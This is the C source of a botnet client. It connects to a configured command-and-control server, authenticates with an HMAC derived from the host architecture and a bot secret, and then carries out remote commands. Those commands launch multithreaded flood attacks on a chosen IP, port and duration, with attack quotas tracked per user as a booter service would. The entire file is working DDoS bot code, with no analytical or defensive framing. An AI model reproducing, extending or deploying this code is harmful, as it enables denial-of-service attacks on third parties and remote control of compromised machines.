#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include "attacks.h"
#include "config.h"

user_attack_t user_attacks[MAX_USERS];
int user_count = 0;
pthread_mutex_t user_mutex = PTHREAD_MUTEX_INITIALIZER;

char *get_architecture() {
    static char arch[64];
    FILE *fp;

    fp = popen("uname -m", "r");
    if (fp == NULL) {
        strcpy(arch, "unknown");
    } else {
        if (fgets(arch, sizeof(arch) - 1, fp) != NULL) {
            arch[strcspn(arch, "\n")] = 0;
        } else {
            strcpy(arch, "unknown");
        }
        pclose(fp);
    }

    return arch;
}

int base64_decode(const char *input, unsigned char *output, int *outlen) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, k = 0;
    unsigned char temp[4];
    *outlen = 0;

    while (input[i] != '\0' && input[i] != '=') {
        const char *pos = strchr(base64_chars, input[i]);
        if (pos == NULL) {
            i++;
            continue;
        }
        temp[j++] = pos - base64_chars;
        
        if (j == 4) {
            output[k++] = (temp[0] << 2) | (temp[1] >> 4);
            output[k++] = ((temp[1] & 0x0F) << 4) | (temp[2] >> 2);
            output[k++] = ((temp[2] & 0x03) << 6) | temp[3];
            j = 0;
            *outlen = k;
        }
        i++;
    }
    
    if (j > 0) {
        if (j >= 2) output[k++] = (temp[0] << 2) | (temp[1] >> 4);
        if (j >= 3) output[k++] = ((temp[1] & 0x0F) << 4) | (temp[2] >> 2);
        *outlen = k;
    }
    
    return (*outlen > 0) ? 0 : -1;
}

void generate_bot_auth(const char *arch, char *auth_output) {
    unsigned char secret[32];
    int secret_len = 0;
    
    if (strcmp(BOT_SECRET_B64, "CHANGE_THIS_IN_CONFIG_JSON") == 0) {
        strcpy(auth_output, "");
        return;
    }
    
    if (base64_decode(BOT_SECRET_B64, secret, &secret_len) != 0 || secret_len != 32) {
        strcpy(auth_output, "");
        return;
    }
    
    unsigned char hmac_result[EVP_MAX_MD_SIZE];
    unsigned int hmac_len;
    
    HMAC(EVP_sha256(), secret, 32, (unsigned char *)arch, strlen(arch), 
         hmac_result, &hmac_len);
    
    for (unsigned int i = 0; i < hmac_len; i++) {
        sprintf(auth_output + (i * 2), "%02x", hmac_result[i]);
    }
    auth_output[hmac_len * 2] = '\0';
}

void start_attack(const char *method, const char *ip, int port, int duration, int thread_count, const char *username) {
    int i, user_index = -1;
    
    printf("[INFO] Starting attack: %s -> %s:%d (%ds, %d threads) [User: %s]\n", 
           method, ip, port, duration, thread_count, username);

    pthread_mutex_lock(&user_mutex);

    // Find or create user
    for (i = 0; i < user_count; i++) {
        if (strcmp(user_attacks[i].username, username) == 0) {
            user_index = i;
            break;
        }
    }

    if (user_index == -1) {
        if (user_count >= MAX_USERS) {
            printf("[ERROR] Maximum users reached\n");
            pthread_mutex_unlock(&user_mutex);
            return;
        }
        user_index = user_count++;
        strcpy(user_attacks[user_index].username, username);
        user_attacks[user_index].attack_count = 0;
    }

    if (user_attacks[user_index].attack_count >= MAX_ATTACKS_PER_USER) {
        printf("[ERROR] User %s has reached maximum attacks (%d/%d)\n", 
               username, user_attacks[user_index].attack_count, MAX_ATTACKS_PER_USER);
        pthread_mutex_unlock(&user_mutex);
        return;
    }

    int attack_index = user_attacks[user_index].attack_count;
    
    // Initialize attack slot
    user_attacks[user_index].attacks[attack_index].stop = 0;
    user_attacks[user_index].attacks[attack_index].active = 1;
    user_attacks[user_index].attacks[attack_index].thread_count = 0;

    pthread_mutex_unlock(&user_mutex);

    void *(*attack_func)(void *) = get_attack_function(method);
    
    if (attack_func == NULL) {
        printf("[ERROR] Unknown method: %s\n", method);
        return;
    }

    // Create attack threads
    int successful = 0;
    for (i = 0; i < thread_count && i < MAX_THREADS; i++) {
        attack_params_t *params = malloc(sizeof(attack_params_t));
        if (params == NULL) {
            printf("[ERROR] Failed to allocate memory for thread %d\n", i);
            continue;
        }
        
        strncpy(params->ip, ip, sizeof(params->ip) - 1);
        params->ip[sizeof(params->ip) - 1] = '\0';
        params->port = port;
        params->end_time = time(NULL) + duration;
        params->stop_flag = &user_attacks[user_index].attacks[attack_index].stop;

        pthread_t thread;
        if (pthread_create(&thread, NULL, attack_func, params) == 0) {
            pthread_detach(thread);
            successful++;
        } else {
            printf("[ERROR] Failed to create thread %d\n", i);
            free(params);
        }
    }

    if (successful > 0) {
        pthread_mutex_lock(&user_mutex);
        user_attacks[user_index].attacks[attack_index].thread_count = successful;
        user_attacks[user_index].attack_count++;
        pthread_mutex_unlock(&user_mutex);
        
        printf("[SUCCESS] Attack started with %d/%d threads\n", successful, thread_count);
    } else {
        printf("[ERROR] Failed to start any threads\n");
        pthread_mutex_lock(&user_mutex);
        user_attacks[user_index].attacks[attack_index].active = 0;
        pthread_mutex_unlock(&user_mutex);
    }
}

void stop_attacks(const char *username) {
    int i, user_index = -1;

    pthread_mutex_lock(&user_mutex);

    // Find user
    for (i = 0; i < user_count; i++) {
        if (strcmp(user_attacks[i].username, username) == 0) {
            user_index = i;
            break;
        }
    }

    if (user_index == -1) {
        printf("[INFO] No attacks found for user: %s\n", username);
        pthread_mutex_unlock(&user_mutex);
        return;
    }

    int total_attacks = user_attacks[user_index].attack_count;
    if (total_attacks == 0) {
        printf("[INFO] User %s has no active attacks\n", username);
        pthread_mutex_unlock(&user_mutex);
        return;
    }

    printf("[INFO] Stopping %d attack(s) for user: %s\n", total_attacks, username);

    for (i = 0; i < total_attacks; i++) {
        if (user_attacks[user_index].attacks[i].active) {
            user_attacks[user_index].attacks[i].stop = 1;
            printf("[INFO] Signaled attack slot %d to stop (%d threads)\n", 
                   i, user_attacks[user_index].attacks[i].thread_count);
        }
    }

    pthread_mutex_unlock(&user_mutex);

    sleep(2);

    pthread_mutex_lock(&user_mutex);
    
    for (i = 0; i < total_attacks; i++) {
        user_attacks[user_index].attacks[i].active = 0;
        user_attacks[user_index].attacks[i].stop = 0;
        user_attacks[user_index].attacks[i].thread_count = 0;
    }
    
    user_attacks[user_index].attack_count = 0;
    
    pthread_mutex_unlock(&user_mutex);
    
    printf("[SUCCESS] All attacks stopped for user: %s\n", username);
}

void handle_command(int sock, char *buffer) {
    char command[64] = {0};
    char ip[128] = {0};
    int port = 0, duration = 0, threads = 0;
    char username[32] = "default";

    char *token = strtok(buffer, " ");
    if (token == NULL) return;

    strncpy(command, token, sizeof(command) - 1);

    for (int i = 0; command[i]; i++) {
        if (command[i] >= 'A' && command[i] <= 'Z') {
            command[i] = command[i] + 32;
        }
    }

    if (strcmp(command, "ping") == 0) {
        send(sock, "PONG\n", 5, 0);
        printf("[INFO] Responded to PING\n");
        return;
    }

    if (strcmp(command, "stop") == 0) {
        token = strtok(NULL, " \n\r");
        if (token != NULL) {
            strncpy(username, token, sizeof(username) - 1);
            username[strcspn(username, "\n")] = 0;
            username[strcspn(username, "\r")] = 0;
            stop_attacks(username);
        } else {
            printf("[ERROR] STOP command requires username\n");
            send(sock, "ERROR: Username required\n", 25, 0);
        }
        return;
    }

    // Parse attack parameters
    token = strtok(NULL, " ");
    if (token == NULL) {
        printf("[ERROR] Missing IP parameter\n");
        return;
    }
    strncpy(ip, token, sizeof(ip) - 1);

    token = strtok(NULL, " ");
    if (token == NULL) {
        printf("[ERROR] Missing port parameter\n");
        return;
    }
    port = atoi(token);

    token = strtok(NULL, " ");
    if (token == NULL) {
        printf("[ERROR] Missing duration parameter\n");
        return;
    }
    duration = atoi(token);

    token = strtok(NULL, " ");
    if (token == NULL) {
        printf("[ERROR] Missing threads parameter\n");
        return;
    }
    threads = atoi(token);

    token = strtok(NULL, " \n\r");
    if (token != NULL) {
        strncpy(username, token, sizeof(username) - 1);
        username[strcspn(username, "\n")] = 0;
        username[strcspn(username, "\r")] = 0;
    }

    // Validate parameters
    if (port <= 0 || port > 65535) {
        printf("[ERROR] Invalid port: %d\n", port);
        return;
    }

    if (duration <= 0 || duration > 3600) {
        printf("[ERROR] Invalid duration: %d (max 3600s)\n", duration);
        return;
    }

    if (threads <= 0 || threads > MAX_THREADS) {
        printf("[ERROR] Invalid thread count: %d (max %d)\n", threads, MAX_THREADS);
        return;
    }

    start_attack(command, ip, port, duration, threads, username);
}


int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];

    srand(time(NULL));
    signal(SIGPIPE, SIG_IGN);
    memset(user_attacks, 0, sizeof(user_attacks));

    printf("[INIT] Bot starting...\n");
    printf("[INFO] Max users: %d, Max attacks per user: %d, Max threads: %d\n", 
           MAX_USERS, MAX_ATTACKS_PER_USER, MAX_THREADS);
    sleep(1);

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            printf("[ERROR] Failed to create socket\n");
            sleep(20);
            continue;
        }

        int keepalive = 1;
        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));

        struct timeval timeout;
        timeout.tv_sec = 10;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(C2_ADDRESS);
        server.sin_port = htons(C2_PORT);

        printf("[INFO] Connecting to C2: %s:%d\n", C2_ADDRESS, C2_PORT);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            printf("[ERROR] Connection failed, retrying in 20s...\n");
            close(sock);
            sleep(20);
            continue;
        }

        printf("[INFO] Connected! Waiting for authentication...\n");
        sleep(1);

        // Authentication
        memset(buffer, 0, BUFFER_SIZE);
        int recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
        
        if (recv_size > 0 && strstr(buffer, "Username") != NULL) {
            sleep(1);
            char *arch = get_architecture();
            char userbuf[128];
            snprintf(userbuf, sizeof(userbuf), "%s\n", arch);
            send(sock, userbuf, strlen(userbuf), 0);
            printf("[INFO] Sent username: %s\n", arch);
            
            memset(buffer, 0, BUFFER_SIZE);
            recv_size = recv(sock, buffer, BUFFER_SIZE, 0);

            if (recv_size > 0 && strstr(buffer, "Password") != NULL) {
                char auth_token[65];
                generate_bot_auth(arch, auth_token);
                if (strlen(auth_token) > 0) {
                    char passbuf[128];
                    snprintf(passbuf, sizeof(passbuf), "%s\n", auth_token);
                    send(sock, passbuf, strlen(passbuf), 0);
                    printf("[INFO] Authenticated successfully with HMAC\n");
                } else {
                    printf("[ERROR] Failed to generate authentication token\n");
                    close(sock);
                    sleep(20);
                    continue;
                }
            }
        }

        // Command loop
        printf("[INFO] Entering command loop...\n");
        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            recv_size = recv(sock, buffer, BUFFER_SIZE - 1, 0);
            
            if (recv_size <= 0) {
                printf("[ERROR] Connection lost (recv_size=%d), reconnecting...\n", recv_size);
                break;
            }

            buffer[recv_size] = '\0';
            buffer[strcspn(buffer, "\n")] = 0;
            buffer[strcspn(buffer, "\r")] = 0;

            if (strlen(buffer) > 0) {
                printf("[CMD] Received: %s\n", buffer);
                handle_command(sock, buffer);
            }
        }

        close(sock);
        printf("[INFO] Connection closed, retrying in 5s...\n");
        sleep(5);
    }

    return 0;
}
